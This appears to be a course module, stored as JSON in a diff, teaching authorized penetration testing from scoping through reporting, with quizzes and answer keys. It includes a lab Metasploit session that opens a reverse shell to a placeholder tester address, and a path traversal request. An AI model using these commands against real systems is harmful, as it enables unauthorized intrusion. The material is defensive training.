@@ -1,0 +1,1082 @@
+{
+ "code": "CORE-11",
+ "intro": "This module explains how authorized penetration testing works from the first contract to the final report. You will learn scope, rules of engagement and legal limits, the PTES phases, passive and active reconnaissance, Nmap scanning and enumeration, the logic of exploitation with frameworks like Metasploit, post-exploitation steps, and how to write findings that help defenders fix problems. Everything is framed for sandbox labs and defense: understanding the attacker process helps you detect it, prevent it and report it well.",
+ "lessons": [
+  {
+   "title": "Ethical hacking, scope and rules of engagement",
+   "why": "Penetration testing is only ethical and legal when it is authorized and bounded, so scope and paperwork come before any tool.",
+   "sections": [
+    {
+     "h": "Authorization and the law",
+     "p": [
+      "Ethical hackers test systems with the written permission of the owner. Without it, the same actions can be a crime. In the United States the Computer Fraud and Abuse Act (CFAA) prohibits accessing a computer without authorization or exceeding authorized access, and other countries have similar laws such as the UK Computer Misuse Act. Permission must come from someone with the authority to grant it for those systems, and third parties matter: cloud providers, hosting companies and managed service providers may need to approve testing of their infrastructure. A signed authorization letter, sometimes called a get-out-of-jail-free letter, should be carried during on-site work."
+     ]
+    },
+    {
+     "h": "Scope documents",
+     "p": [
+      "Several documents define the engagement. A non-disclosure agreement (NDA) protects client information. A master services agreement (MSA) sets general terms, and a statement of work (SOW) lists objectives, deliverables, timeline and price. The rules of engagement (RoE) describe exactly what is allowed: in-scope IP ranges and domains, out-of-scope systems, testing hours, permitted techniques, whether denial of service or social engineering is allowed, how to handle sensitive data, emergency contacts and how to stop if something breaks. If an asset is not listed as in scope, treat it as out of scope and ask."
+     ]
+    },
+    {
+     "h": "Types of tests and perspectives",
+     "p": [
+      "Tests differ by how much information the tester receives. In a black box test the tester knows almost nothing, which resembles an outside attacker but takes longer. In a grey box test the tester has partial information such as a user account or network diagram. In a white box test the tester has full details including source code and architecture, which gives the deepest coverage in limited time. Tests also differ by target: external network, internal network, web application, wireless, cloud, mobile and social engineering. Red team exercises are goal-based and stealthier, while a vulnerability assessment lists weaknesses without exploiting them."
+     ]
+    },
+    {
+     "h": "Professional conduct",
+     "p": [
+      "A tester protects client data, minimizes harm and reports honestly. Use encrypted storage for findings, avoid keeping real sensitive data longer than needed, and never test on systems outside the scope even if you discover them. If you find evidence of a real crime or an active attacker, stop and notify the designated contact immediately. Take care with production systems: avoid risky tests during business hours unless agreed, keep logs of every action with timestamps so the client can match them to their own monitoring, and obtain written approval for any change to the plan. Trust is the product you sell."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Rules of engagement excerpt",
+    "text": "Client: Example Corp (fictional)\nIn scope : 198.51.100.0/28, test.example.com\nOut of scope: payroll.example.com, any third-party SaaS\nWindow   : Mon-Fri 22:00-06:00 UTC\nAllowed  : scanning, web testing, password audit (rate limited)\nForbidden: denial of service, social engineering\nEmergency: SOC lead +1-555-0100"
+   },
+   "example": "A tester is asked to look at 'our external network'. The tester insists on a signed RoE listing 198.51.100.0/28 and test.example.com. During scanning, a host at 198.51.100.40 responds with a banner for a payment provider. It is not in the list, so the tester stops, records it and asks the client contact whether it is theirs and whether it may be added in writing. Scope creep without written approval would expose the tester to legal risk.",
+   "terms": [
+    {
+     "term": "CFAA",
+     "def": "US law prohibiting unauthorized access to computers."
+    },
+    {
+     "term": "Rules of engagement",
+     "def": "The document defining what testers may and may not do."
+    },
+    {
+     "term": "SOW",
+     "def": "Statement of work that lists objectives and deliverables."
+    },
+    {
+     "term": "Black box",
+     "def": "Testing with no prior knowledge of the target."
+    },
+    {
+     "term": "White box",
+     "def": "Testing with full knowledge of systems and code."
+    },
+    {
+     "term": "Scope creep",
+     "def": "Expanding testing beyond the agreed targets."
+    }
+   ],
+   "check": [
+    {
+     "q": "What gives a tester legal permission to test?",
+     "options": [
+      "A vulnerability scanner license",
+      "Written authorization from someone with authority over the systems",
+      "A security certification",
+      "A public IP address"
+     ],
+     "a": 1,
+     "why": "Without written authorization from the owner, testing can be a crime."
+    },
+    {
+     "q": "Which document lists exactly which techniques and targets are allowed?",
+     "options": [
+      "NDA",
+      "Rules of engagement",
+      "Invoice",
+      "Resume"
+     ],
+     "a": 1,
+     "why": "The RoE defines permitted actions and boundaries."
+    },
+    {
+     "q": "A tester is given a low-privilege account and network diagram. This is:",
+     "options": [
+      "Black box",
+      "Grey box",
+      "White box only",
+      "Red team only"
+     ],
+     "a": 1,
+     "why": "Partial knowledge defines grey box testing."
+    },
+    {
+     "q": "You discover an unlisted server during a scan. You should:",
+     "options": [
+      "Test it anyway",
+      "Stop and ask for written scope approval",
+      "Delete it",
+      "Publish it"
+     ],
+     "a": 1,
+     "why": "Unlisted systems are out of scope until approved."
+    }
+   ],
+   "recap": [
+    "Written authorization and a clear scope come first.",
+    "NDA, SOW and RoE define terms, goals and limits.",
+    "Black, grey and white box differ by prior knowledge."
+   ]
+  },
+  {
+   "title": "Pentest methodology",
+   "why": "A methodology keeps a test thorough and repeatable and gives clients a clear picture of what was done.",
+   "sections": [
+    {
+     "h": "Why use a standard method",
+     "p": [
+      "Ad hoc testing misses areas and is hard to explain. Standards give structure: the Penetration Testing Execution Standard (PTES), NIST SP 800-115, the OWASP Web Security Testing Guide (WSTG) for web applications and OSSTMM. PTES describes seven stages. Clients expect a methodology to be named in the report, along with the tools, dates and the tester's actions. A method also helps you decide when you are finished: when each phase's objectives are met or time is up."
+     ]
+    },
+    {
+     "h": "The PTES phases",
+     "p": [
+      "PTES stages are pre-engagement interactions (scope, contracts, goals), intelligence gathering (reconnaissance), threat modeling (identifying valuable assets and likely attackers), vulnerability analysis (finding and validating weaknesses), exploitation (proving that a weakness can be used), post-exploitation (determining impact and value of the access) and reporting. Many courses compress these into planning, recon, scanning and enumeration, exploitation, post-exploitation and reporting. Each phase feeds the next: scan results guide which exploits to consider, and what is achieved after exploitation shapes the business impact described in the report."
+     ]
+    },
+    {
+     "h": "The cycle of work",
+     "p": [
+      "Real testing is iterative rather than linear. A foothold on one host provides new networks to scan, new credentials to test and new data to find, so the tester returns to enumeration. Time-boxing prevents rabbit holes. Keep notes in a structured tool, record the exact commands, outputs and timestamps, and take screenshots as evidence. Tag each finding with the affected asset, evidence and a first impression of severity. Good notes make the reporting phase quick and the results reproducible by the client's engineers."
+     ]
+    },
+    {
+     "h": "Safety and communication",
+     "p": [
+      "During the test, keep in touch with the client. Agree on status updates, and report critical findings immediately instead of waiting for the final report, for example an exposed administrative interface or evidence of prior compromise. Avoid actions that cause outages, and confirm backups exist before risky tests. Keep a log so the SOC can distinguish your activity from a real attack. A retest after fixes is often included to confirm remediation. The goal is to reduce the organization's risk, not to prove cleverness."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "PTES summary",
+    "text": "1 Pre-engagement   scope, RoE, goals\n2 Intelligence     OSINT, DNS, recon\n3 Threat modeling assets, attackers\n4 Vuln analysis   scan, validate\n5 Exploitation    prove impact\n6 Post-exploit    value of access, cleanup\n7 Reporting       findings, fixes, retest"
+   },
+   "example": "A tester working on Example Corp spends the first day on scoping and OSINT, then enumerates hosts at 198.51.100.0/28 and finds an outdated file transfer service. They validate the flaw, obtain a limited shell on a test server and discover stored credentials, which they use to reach an internal database in scope. They stop there, record each step with timestamps and phone the client's contact about the critical exposure the same day, then write the full report with remediation advice.",
+   "terms": [
+    {
+     "term": "PTES",
+     "def": "Penetration Testing Execution Standard describing seven phases."
+    },
+    {
+     "term": "Threat modeling",
+     "def": "Identifying valuable assets and likely attack paths."
+    },
+    {
+     "term": "OWASP WSTG",
+     "def": "A guide for testing web application security."
+    },
+    {
+     "term": "Foothold",
+     "def": "Initial access to a system during a test."
+    },
+    {
+     "term": "Time-boxing",
+     "def": "Limiting the time spent on one task."
+    },
+    {
+     "term": "Retest",
+     "def": "A follow-up test confirming that fixes work."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which PTES phase comes immediately before exploitation?",
+     "options": [
+      "Reporting",
+      "Vulnerability analysis",
+      "Post-exploitation",
+      "Retesting"
+     ],
+     "a": 1,
+     "why": "You find and validate weaknesses before exploiting them."
+    },
+    {
+     "q": "Why report critical findings immediately?",
+     "options": [
+      "To increase the price",
+      "Waiting could leave serious exposure open",
+      "The report is optional",
+      "To delete logs"
+     ],
+     "a": 1,
+     "why": "Critical exposures should not wait for the final report."
+    },
+    {
+     "q": "Which standard focuses on web application testing?",
+     "options": [
+      "OWASP WSTG",
+      "OSI model",
+      "RFC 791",
+      "PCI DSS"
+     ],
+     "a": 0,
+     "why": "The Web Security Testing Guide covers web tests."
+    },
+    {
+     "q": "Testing is described as iterative because:",
+     "options": [
+      "Tools restart",
+      "New access reveals new targets and returns the tester to enumeration",
+      "Clients change prices",
+      "Scans loop forever"
+     ],
+     "a": 1,
+     "why": "Each foothold opens further reconnaissance and testing."
+    }
+   ],
+   "recap": [
+    "Follow a method: PTES or a similar standard.",
+    "Phases feed each other and repeat as access grows.",
+    "Keep detailed notes and communicate critical findings early."
+   ]
+  },
+  {
+   "title": "Reconnaissance and OSINT",
+   "why": "Reconnaissance builds the picture of the target, and much of it needs no direct contact with the target at all.",
+   "sections": [
+    {
+     "h": "Passive versus active",
+     "p": [
+      "Passive reconnaissance gathers information without interacting with the target's systems, using public sources, so it leaves no trace in the target's logs. Active reconnaissance sends traffic to the target, such as DNS queries to its servers or port scans, and can be detected. Passive work happens first and uses open source intelligence (OSINT). Typical goals are domains and subdomains, IP ranges, employees and email formats, technologies in use, third-party providers, leaked credentials and exposed documents. Everything found must still be checked against the scope before any active step."
+     ]
+    },
+    {
+     "h": "DNS, whois and certificates",
+     "p": [
+      "The whois service shows registration data for domains and IP blocks, such as registrar, creation date and name servers, although many fields are redacted for privacy. DNS records reveal infrastructure: A and AAAA for addresses, MX for mail, NS for name servers, TXT for SPF and verification strings and CNAME for aliases. Tools like dig and nslookup query them. A zone transfer (AXFR) request should be refused by properly configured servers. Certificate Transparency logs, searchable through crt.sh, list issued certificates and reveal subdomains such as vpn.example.com or dev.example.com."
+     ]
+    },
+    {
+     "h": "Search engines and internet scanners",
+     "p": [
+      "Google dorks use operators to find exposed content: site:example.com filetype:pdf finds documents, intitle:\"index of\" can reveal open directory listings, and inurl: finds specific paths. Shodan and Censys continuously scan the internet and index banners, so you can see which services and versions an organization exposes without scanning yourself. theHarvester collects emails, names and subdomains from search engines and public sources. Wappalyzer or whatweb-style fingerprinting shows web technologies. Social media and job postings reveal technology stacks, naming conventions and staff roles."
+     ]
+    },
+    {
+     "h": "Using results responsibly",
+     "p": [
+      "Organize findings in a notes tool: asset, source, date and confidence. Verify that discovered assets belong to the client; shared hosting and cloud addresses may belong to others. Limit personal data collection to what the engagement needs. Defenders can reduce exposure by removing metadata from documents, trimming public staff details, monitoring Certificate Transparency for unknown certificates, securing DNS, closing unneeded exposed services and checking what Shodan says about their own ranges. Reconnaissance defines the attack surface, so it is equally useful in an organization's own asset management."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Terminal output",
+    "text": "$ whois example.com | head -5\nDomain Name: EXAMPLE.COM\nRegistrar: Example Registrar, Inc.\nName Server: A.IANA-SERVERS.NET\n$ dig +short MX example.com\n0 .\n$ dig +short TXT example.com\n\"v=spf1 -all\""
+   },
+   "example": "For the fictional Example Corp, passive research finds that Certificate Transparency lists vpn.example.com, dev.example.com and old-portal.example.com. Shodan shows dev.example.com exposing a development web server on 198.51.100.12 with a version banner, and a job posting mentions a particular content management system. None of this touched the client. The tester confirms all three hosts fall within scope, flags old-portal as a likely forgotten asset, and plans active scanning for the next phase.",
+   "terms": [
+    {
+     "term": "OSINT",
+     "def": "Intelligence gathered from public sources."
+    },
+    {
+     "term": "Passive recon",
+     "def": "Collecting information without touching the target."
+    },
+    {
+     "term": "Certificate Transparency",
+     "def": "Public logs of issued TLS certificates."
+    },
+    {
+     "term": "Google dork",
+     "def": "A search query using operators to find exposed information."
+    },
+    {
+     "term": "Shodan",
+     "def": "A search engine indexing internet-facing service banners."
+    },
+    {
+     "term": "AXFR",
+     "def": "A DNS zone transfer request that should be restricted."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which is passive reconnaissance?",
+     "options": [
+      "Port scanning the target",
+      "Searching Certificate Transparency logs",
+      "Brute forcing logins",
+      "Sending exploit traffic"
+     ],
+     "a": 1,
+     "why": "CT log searches use public data and do not touch the target."
+    },
+    {
+     "q": "Which DNS record type shows mail servers?",
+     "options": [
+      "A",
+      "MX",
+      "NS",
+      "PTR"
+     ],
+     "a": 1,
+     "why": "MX records list mail exchangers."
+    },
+    {
+     "q": "What does Shodan provide?",
+     "options": [
+      "Exploits",
+      "Indexed banners of internet-exposed services",
+      "Password hashes",
+      "Source code"
+     ],
+     "a": 1,
+     "why": "It indexes responses from services on the internet."
+    },
+    {
+     "q": "A defender can reduce recon exposure by:",
+     "options": [
+      "Publishing org charts",
+      "Removing metadata and unneeded exposed services",
+      "Keeping forgotten subdomains",
+      "Allowing zone transfers"
+     ],
+     "a": 1,
+     "why": "Less public information and fewer exposed services reduce the attack surface."
+    }
+   ],
+   "recap": [
+    "Passive recon uses public data and leaves no trace.",
+    "DNS, whois, CT logs, dorks and Shodan reveal infrastructure.",
+    "Verify scope and ownership before moving to active steps."
+   ]
+  },
+  {
+   "title": "Scanning and enumeration",
+   "why": "Scanning turns a list of addresses into a map of live hosts, open ports and exact service versions, which drives every later decision.",
+   "sections": [
+    {
+     "h": "Host discovery and port scanning",
+     "p": [
+      "Nmap is the standard network scanner. Host discovery with nmap -sn 198.51.100.0/28 checks which hosts are up using ping, ARP on local networks and probes to common ports, without scanning ports. The default scan checks the 1000 most common TCP ports. A SYN scan (-sS) sends SYN packets and does not complete the handshake, so it is fast and needs root privileges. A connect scan (-sT) uses the full TCP handshake and works without privileges. UDP scans (-sU) are slower because open ports may not answer. Port states are open, closed, filtered (a firewall dropped the probe) and open|filtered."
+     ]
+    },
+    {
+     "h": "Service and version detection",
+     "p": [
+      "The -sV option probes open ports to identify the service and version, using banners and responses. The -O option guesses the operating system, and -A enables several detections at once. Version data is what links a host to known vulnerabilities. Timing options such as -T3 (default) and -T4 balance speed and noise, and slower scans are quieter. The -p option sets ports, for example -p 1-65535 or -p 22,80,443. Output formats like -oA save normal, XML and grepable results together, which is useful for reports and later parsing."
+     ]
+    },
+    {
+     "h": "Nmap Scripting Engine",
+     "p": [
+      "The Nmap Scripting Engine (NSE) runs Lua scripts for detection and enumeration. Categories include default, safe, discovery, vuln and auth. Running -sC uses the default set. Examples: http-title shows a page title, ssl-cert shows certificate details, smb-os-discovery reveals Windows host information, and ftp-anon checks for anonymous FTP. Scripts in the vuln or exploit categories can be intrusive and may crash services, so only run them within the rules of engagement. Always read what a script does before running it on production."
+     ]
+    },
+    {
+     "h": "Enumeration of SMB and web services",
+     "p": [
+      "Enumeration extracts detailed information from specific services. For SMB (ports 139 and 445), tools such as smbclient and enum4linux-ng can list shares, users and policies, and anonymous or guest access is a common finding. For web servers, check the server header, robots.txt, directory listings and use content discovery tools such as gobuster or ffuf with a wordlist to find hidden paths, at a rate agreed with the client. Also enumerate SNMP with community strings, DNS, LDAP and databases. Defenders reduce results by disabling anonymous access, hiding banners, patching, restricting management interfaces and filtering ports."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Nmap output",
+    "text": "$ nmap -sV -sC 198.51.100.10\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.4p1 Debian\n80/tcp  open  http    Apache httpd 2.4.38\n|_http-title: Example Corp Intranet\n445/tcp open  netbios-ssn Samba smbd 4.9.5\n3306/tcp filtered mysql"
+   },
+   "example": "The output above shows SSH, a web server, SMB and a filtered MySQL port. The tester notes that Apache 2.4.38 is old and checks for known issues, runs SMB enumeration and finds an anonymous share named backups. MySQL is filtered, meaning a firewall blocks it from outside, which is correct. In the report, the open anonymous share becomes a finding, and the filtered database port is recorded as good practice. All commands and timestamps are saved with -oA.",
+   "terms": [
+    {
+     "term": "SYN scan",
+     "def": "A fast scan that sends SYN packets without completing the handshake."
+    },
+    {
+     "term": "Filtered port",
+     "def": "A port where a firewall drops or blocks probes."
+    },
+    {
+     "term": "-sV",
+     "def": "Nmap option that detects service versions."
+    },
+    {
+     "term": "NSE",
+     "def": "Nmap Scripting Engine, which runs Lua scripts."
+    },
+    {
+     "term": "Enumeration",
+     "def": "Extracting detailed information from a discovered service."
+    },
+    {
+     "term": "Content discovery",
+     "def": "Finding hidden web paths using wordlists."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which Nmap option detects service versions?",
+     "options": [
+      "-sn",
+      "-sV",
+      "-oA",
+      "-T0"
+     ],
+     "a": 1,
+     "why": "-sV probes open ports for version details."
+    },
+    {
+     "q": "A port shown as filtered usually means:",
+     "options": [
+      "It is open",
+      "A firewall is blocking probes",
+      "The host is down",
+      "It runs UDP"
+     ],
+     "a": 1,
+     "why": "Filtered means probes get no clear answer because of filtering."
+    },
+    {
+     "q": "Which scan does not require raw socket privileges?",
+     "options": [
+      "-sS",
+      "-sT",
+      "-sU",
+      "-O"
+     ],
+     "a": 1,
+     "why": "A connect scan uses the normal TCP connect call."
+    },
+    {
+     "q": "Why be careful with NSE vuln scripts?",
+     "options": [
+      "They are slow only",
+      "Some are intrusive and can crash services",
+      "They need no scope",
+      "They are encrypted"
+     ],
+     "a": 1,
+     "why": "Intrusive scripts can disrupt systems and must follow the RoE."
+    }
+   ],
+   "recap": [
+    "Discover hosts, scan ports, then detect versions.",
+    "NSE scripts add detection and enumeration but can be intrusive.",
+    "Enumerate SMB and web services for shares, users and hidden paths."
+   ]
+  },
+  {
+   "title": "Exploitation overview",
+   "why": "Exploitation shows whether a weakness is real and what an attacker could do with it, always inside the agreed lab or scope.",
+   "sections": [
+    {
+     "h": "From finding to exploit",
+     "p": [
+      "Exploitation means using a vulnerability to gain access or control. A tester first matches service versions to known flaws, using NVD, vendor advisories and Exploit-DB, and confirms the target is truly vulnerable. Prefer the least risky path that proves impact: a misconfiguration or weak credential is often safer than a memory corruption exploit that could crash a service. Check the stability notes, test in a lab copy when possible, have a rollback plan and avoid destructive payloads. Explain impact to the client, not just success."
+     ]
+    },
+    {
+     "h": "Metasploit concepts",
+     "p": [
+      "The Metasploit Framework organizes exploitation into modules. Exploit modules take advantage of a vulnerability, auxiliary modules scan or enumerate, payloads define what runs after success, encoders and post modules extend capabilities. Workflow in the msfconsole: search for a module, use it, view and set options such as RHOSTS (target) and LHOST (the tester's address), choose a payload, then run. Options must match the scope exactly. Metasploit also stores hosts and credentials in a workspace database, which helps with reporting. Other tools include searchsploit, custom scripts and framework alternatives."
+     ]
+    },
+    {
+     "h": "Payloads and sessions",
+     "p": [
+      "A payload is what executes on the target after the exploit. A reverse shell makes the target connect back to the tester, which works through firewalls that allow outbound traffic, while a bind shell opens a listening port on the target. Staged payloads send a small first stage that downloads the rest, and stageless payloads contain everything in one piece. Meterpreter is an in-memory Metasploit payload with many features. Defenders can detect these through egress filtering, EDR alerts on unusual process behavior, network monitoring for unexpected outbound connections and application allow listing."
+     ]
+    },
+    {
+     "h": "Web exploitation in scope",
+     "p": [
+      "Web testing follows the OWASP Top 10: injection, broken access control, authentication failures, cryptographic failures, misconfiguration and others. Testers use an intercepting proxy such as Burp Suite or OWASP ZAP to inspect and modify requests, and check input handling, session management and access control between users. In labs, intentionally vulnerable applications such as DVWA or OWASP Juice Shop are used for practice. Findings should record the request, the response, the affected parameter and the impact. Defenders fix root causes with input validation, parameterized queries, output encoding, patching and a web application firewall as an additional layer."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Metasploit-style session (lab)",
+    "text": "msf6 > search type:exploit examplehttpd\nmsf6 > use exploit/lab/examplehttpd_traversal\nmsf6 > set RHOSTS 192.0.2.70\nmsf6 > set PAYLOAD generic/shell_reverse_tcp\nmsf6 > set LHOST 192.0.2.5\nmsf6 > run\n[*] Command shell session 1 opened (lab only)"
+   },
+   "example": "In a sandbox with written scope for 192.0.2.70, the tester finds ExampleHTTPd 2.4.1 and matches it to a known path traversal flaw. Rather than a risky memory exploit, they select the traversal module, set RHOSTS to the lab host and a reverse shell payload with LHOST as the tester machine, and obtain a low-privilege shell. They record the module, options and output, then stop and report that unpatched software lets an unauthenticated attacker read files and run commands.",
+   "terms": [
+    {
+     "term": "Exploit",
+     "def": "Code or technique that takes advantage of a vulnerability."
+    },
+    {
+     "term": "Payload",
+     "def": "The code that runs on the target after exploitation."
+    },
+    {
+     "term": "Reverse shell",
+     "def": "A shell where the target connects back to the attacker."
+    },
+    {
+     "term": "Auxiliary module",
+     "def": "A Metasploit module for scanning or enumeration."
+    },
+    {
+     "term": "RHOSTS",
+     "def": "Metasploit option naming the remote target."
+    },
+    {
+     "term": "Intercepting proxy",
+     "def": "A tool such as Burp Suite that inspects and modifies web traffic."
+    }
+   ],
+   "check": [
+    {
+     "q": "In Metasploit, RHOSTS sets:",
+     "options": [
+      "The attacker address",
+      "The target address",
+      "The payload size",
+      "The log path"
+     ],
+     "a": 1,
+     "why": "RHOSTS is the remote host to target."
+    },
+    {
+     "q": "A reverse shell:",
+     "options": [
+      "Opens a port on the target",
+      "Connects from the target back to the tester",
+      "Needs no network",
+      "Is always encrypted"
+     ],
+     "a": 1,
+     "why": "The target initiates the connection back."
+    },
+    {
+     "q": "Which control helps detect reverse shells?",
+     "options": [
+      "Egress filtering and monitoring",
+      "Larger disks",
+      "Longer passwords only",
+      "Open firewalls"
+     ],
+     "a": 0,
+     "why": "Monitoring and restricting outbound traffic exposes unusual callbacks."
+    },
+    {
+     "q": "Why prefer a misconfiguration finding over a memory exploit when proving impact?",
+     "options": [
+      "It is more exciting",
+      "It is usually safer for production stability",
+      "It needs no scope",
+      "It avoids reporting"
+     ],
+     "a": 1,
+     "why": "Lower risk of crashing services while still proving impact."
+    }
+   ],
+   "recap": [
+    "Confirm vulnerability, choose the safest proof of impact.",
+    "Metasploit uses exploit, payload and options like RHOSTS and LHOST.",
+    "Defenders detect with egress control, EDR and patching."
+   ]
+  },
+  {
+   "title": "Post-exploitation",
+   "why": "Post-exploitation answers the question 'so what?' by showing what an attacker could reach once inside, and it must be done carefully and cleaned up.",
+   "sections": [
+    {
+     "h": "Goals and discipline",
+     "p": [
+      "After gaining access, the tester determines what the access is worth: which data, systems and privileges are reachable. Activities must stay in scope, follow the RoE, and avoid damaging data. Stop when the objective is proven; there is no need to copy real sensitive data, and a small proof such as a file listing or a harmless marker file is enough. Document every action. Frameworks describe attacker behavior after entry: MITRE ATT&CK tactics such as privilege escalation, credential access, discovery, lateral movement and persistence. Defenders map detections to those tactics."
+     ]
+    },
+    {
+     "h": "Privilege escalation and credentials",
+     "p": [
+      "Privilege escalation raises access from a normal user to administrator or root. On Linux common weaknesses include sudo rules that allow dangerous programs, SUID binaries that can be abused, writable cron jobs, weak file permissions and outdated kernels. On Windows they include unquoted service paths, weak service permissions, stored credentials and misconfigured token privileges. Credential access means finding passwords, keys and tokens in files, history, memory and configuration. Defenders respond with least privilege, patching, removing unneeded SUID files, protecting credential stores, LAPS and credential guard features."
+     ]
+    },
+    {
+     "h": "Lateral movement and persistence",
+     "p": [
+      "Lateral movement uses obtained credentials or trust relationships to reach other machines, for instance via SSH keys, SMB, WinRM or remote management tools. Pass-the-hash and pass-the-ticket reuse authentication material without knowing a password, which is why segmentation, unique local admin passwords and tiered administration matter. Persistence keeps access across reboots: scheduled tasks, services, startup entries, new accounts or authorized keys. In a pentest persistence is used rarely, only if the RoE allows it, and every artifact is recorded for removal. Real attackers use the same methods, so detections look for new accounts, new services and unusual authentication."
+     ]
+    },
+    {
+     "h": "Cleanup and evidence",
+     "p": [
+      "Cleanup returns the environment to its original state: remove tools, test accounts, files and persistence mechanisms, restore changed settings and tell the client about anything that could not be removed. Provide a list of artifacts and hashes so the SOC can distinguish them from real compromise. Do not erase logs; deleting logs destroys the client's evidence and may be prohibited. Keep proof of access, such as screenshots and command output, in encrypted storage and destroy test data after the retention period in the contract. Honest cleanup is part of professional ethics."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Privilege audit output (lab)",
+    "text": "$ id\nuid=1001(labuser) gid=1001(labuser)\n$ sudo -l\n(root) NOPASSWD: /usr/bin/examplebackup\n\nFinding: labuser may run one maintenance\nbinary as root without a password."
+   },
+   "example": "On a sandbox host, an audit shows that the account labuser is allowed to run one maintenance utility as root without entering a password. Public privilege-escalation checklists list this exact pattern as risky, because a program that runs with root rights can sometimes be steered into giving the invoking user a root shell. The tester records the sudo rule as the finding, confirms in the lab that elevated access results, stops there, and recommends removing the rule or restricting the utility to a safer, logged wrapper.",
+   "terms": [
+    {
+     "term": "Privilege escalation",
+     "def": "Raising access from a limited account to administrator or root."
+    },
+    {
+     "term": "SUID bit",
+     "def": "A file permission that runs a program with its owner's privileges."
+    },
+    {
+     "term": "Credential access",
+     "def": "Finding stored passwords, keys or tokens on a system."
+    },
+    {
+     "term": "Lateral movement",
+     "def": "Using existing access or credentials to reach other hosts."
+    },
+    {
+     "term": "Persistence",
+     "def": "Techniques that keep access available after a reboot."
+    },
+    {
+     "term": "Pass-the-hash",
+     "def": "Reusing a captured password hash to authenticate without the plaintext."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which MITRE ATT&CK tactic involves moving from one compromised host to another?",
+     "options": [
+      "Persistence",
+      "Lateral movement",
+      "Reconnaissance",
+      "Reporting"
+     ],
+     "a": 1,
+     "why": "Lateral movement describes spreading across a network using existing access."
+    },
+    {
+     "q": "An overly permissive sudo rule on a maintenance binary is risky mainly because:",
+     "options": [
+      "It increases disk usage",
+      "It can let a limited account effectively act as root",
+      "It slows the CPU",
+      "It changes the hostname"
+     ],
+     "a": 1,
+     "why": "A program running with root rights can sometimes be misused to reach a root shell."
+    },
+    {
+     "q": "Pass-the-hash attacks matter because they show why organizations should:",
+     "options": [
+      "Reuse the same local admin password everywhere",
+      "Use unique local admin credentials and segment networks",
+      "Disable all logging",
+      "Avoid patching"
+     ],
+     "a": 1,
+     "why": "Unique credentials and segmentation limit how far a stolen hash can be reused."
+    },
+    {
+     "q": "What should a tester do with temporary accounts or files created during post-exploitation?",
+     "options": [
+      "Leave them for the client to find",
+      "Remove them during cleanup and report any that could not be removed",
+      "Publish them",
+      "Encrypt them and keep forever"
+     ],
+     "a": 1,
+     "why": "Cleanup restores the environment and avoids leaving usable access behind."
+    }
+   ],
+   "recap": [
+    "Post-exploitation shows real impact without unnecessary risk or data copying.",
+    "Privilege escalation, credential access, lateral movement and persistence are named ATT&CK tactics.",
+    "Clean up test artifacts and never delete the client's own logs."
+   ]
+  },
+  {
+   "title": "Reporting and remediation advice",
+   "why": "A finding only improves security once it is written so that a developer or administrator can understand and fix it.",
+   "sections": [
+    {
+     "h": "Structuring the report",
+     "p": [
+      "A pentest report usually opens with an executive summary for non-technical readers: scope, overall risk posture, number of findings by severity and top recommendations. The technical section follows with one entry per finding: title, affected asset, CVSS score and vector, description, evidence (requests, screenshots, command output), business impact and clear reproduction steps. An appendix lists tools, dates, in-scope assets and raw output. Reports should be written assuming the reader was not present during testing."
+     ]
+    },
+    {
+     "h": "Writing findings well",
+     "p": [
+      "Each finding needs enough detail for a defender to reproduce and verify the fix, but should avoid unnecessary danger: use the sandbox addresses and redact unrelated sensitive data such as unrelated personal information or full credential values. Separate the technical root cause (for example, missing input validation) from the business impact (unauthorized access to records) so different readers get what they need. Rank severity using CVSS plus context such as exposure and data sensitivity, matching the prioritization approach used in vulnerability management."
+     ]
+    },
+    {
+     "h": "Remediation advice",
+     "p": [
+      "Good remediation advice is specific and ranked: fix the root cause first, for example patch the framework or add parameterized queries, then suggest compensating controls like a web application firewall rule for the short term. Group related findings so one engineering task closes several items. Give realistic timeframes aligned with the organization's SLA policy. Avoid vague advice such as 'improve security'; instead name the exact configuration, header or code change needed, and reference the relevant standard such as OWASP guidance."
+     ]
+    },
+    {
+     "h": "Delivery and follow-up",
+     "p": [
+      "Reports are usually delivered through an encrypted channel or a secure portal, with a readout meeting to walk through findings and answer questions. Many engagements include a retest to confirm fixes, which should check each finding specifically rather than repeating a full scan. Track findings to closure in a register. A professional final step is to thank the client's team and offer to clarify anything, since the goal is a safer system, not just a delivered document."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Finding entry (sample)",
+    "text": "Finding: Outdated web framework allows path traversal\nSeverity: High  CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)\nAsset: 198.51.100.12 (dev.example.com)\nEvidence: GET /files?name=../../etc/hostname returned file contents\nImpact: Unauthorized read access to server files\nFix: Upgrade to version 2.4.3 or later; validate and\n     canonicalize file path input"
+   },
+   "example": "The sample finding above gives the executive reader a one-line business risk (unauthorized file access) and gives the engineering reader the exact request, affected host and fixed version needed to verify and resolve the issue. The report groups this with two similar framework findings under one remediation task, assigns it a 30 day SLA matching the High severity policy, and schedules a retest after the patch window to confirm the fix worked.",
+   "terms": [
+    {
+     "term": "Executive summary",
+     "def": "A non-technical overview of scope, risk and top recommendations."
+    },
+    {
+     "term": "Reproduction steps",
+     "def": "Clear instructions letting a defender verify a finding."
+    },
+    {
+     "term": "Remediation advice",
+     "def": "Specific guidance on how to fix a finding's root cause."
+    },
+    {
+     "term": "Compensating control",
+     "def": "A short-term safeguard used while a full fix is prepared."
+    },
+    {
+     "term": "Retest",
+     "def": "Verification testing performed after fixes are applied."
+    },
+    {
+     "term": "Findings register",
+     "def": "A tracked list of findings through to closure."
+    }
+   ],
+   "check": [
+    {
+     "q": "Who is the executive summary mainly written for?",
+     "options": [
+      "Penetration testers",
+      "Non-technical decision makers",
+      "Search engines",
+      "Attackers"
+     ],
+     "a": 1,
+     "why": "It gives leadership a plain-language view of risk and priorities."
+    },
+    {
+     "q": "A finding's reproduction steps should allow:",
+     "options": [
+      "Only the original tester to repeat it",
+      "A defender to verify and later confirm the fix",
